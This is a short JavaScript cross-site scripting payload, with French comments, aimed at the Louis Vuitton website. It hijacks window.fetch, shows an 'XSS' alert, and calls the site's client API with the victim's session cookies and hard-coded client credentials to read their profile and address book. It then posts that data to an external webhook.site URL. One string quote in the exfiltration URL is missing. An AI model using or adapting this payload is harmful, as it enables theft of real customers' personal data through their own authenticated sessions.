// Sauvegarde la version originale de fetch
const originalFetch = window.fetch;

// RedÃ©finit fetch pour supprimer le cookie avant chaque appel
window.fetch = function(...args) {
    document.cookie = "currentURL=; expires=Thu, 01 Jan 1970 00:00:00 GMT; domain=.louisvuitton.com; path=/";    
    return originalFetch.apply(this, args);
};

window.stop();

alert("XSS")

async function sendLVData() {
  const headers = {
    credentials: 'include',
    headers: {
      'Client_id': '607e3016889f431fb8020693311016c9',
      'Client_secret': '60bbcdcD722D411B88cBb72C8246a22F'
    }
  };

  const addressRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/addressbook?locale=fra-fr', headers);
  const addressData = await addressRes.json();

  const profileRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/profile?locale=eng-e1', headers);
  const profileData = await profileRes.json();

  const payload = {
    profile: profileData,
    addressbook: addressData
  };

  await fetch('https://webhook.site/989da46f-43c6-4e2a-8771-993f5b14dec6, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

sendLVData();
